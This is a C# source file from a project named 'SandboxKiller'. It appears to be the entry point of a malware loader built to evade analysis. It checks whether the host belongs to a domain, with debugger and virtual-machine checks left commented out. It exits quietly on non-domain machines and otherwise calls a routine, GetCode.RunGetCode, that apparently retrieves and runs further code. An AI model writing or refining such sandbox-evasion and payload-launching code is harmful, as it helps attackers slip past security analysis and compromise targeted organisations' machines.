using System;
using System.Threading.Tasks;
using SandboxKiller;

namespace SandboxKillerapp
{
    class Program
    {
        static async Task Main(string[] args)
        {
            int indicator = 0;

            ////bool isDebuggerPresent = DetectDebugger.IsDebuggerPresent();
            //Console.WriteLine($"Is Debugger Present: {isDebuggerPresent}");
            ////if (isDebuggerPresent) indicator++;

            ////bool isInVirtualMachine = DetectVirtualMachine.IsRunningInVirtualMachine();
            //Console.WriteLine($"Is Running in Virtual Machine: {isInVirtualMachine}");
            ////if (isInVirtualMachine) indicator++;

            bool IsRunningInDomain = DomainCheck.IsRunningInDomain();
            //Console.WriteLine($"Is Domain Machine: {IsRunningInDomain}");
            if (!IsRunningInDomain) indicator++;

            if (indicator != 0)
            {
                Environment.Exit(0); // Cierra el programa
            }
            else
            {
                await GetCode.RunGetCode();
            }
            Console.ReadLine();
        }
    }
}

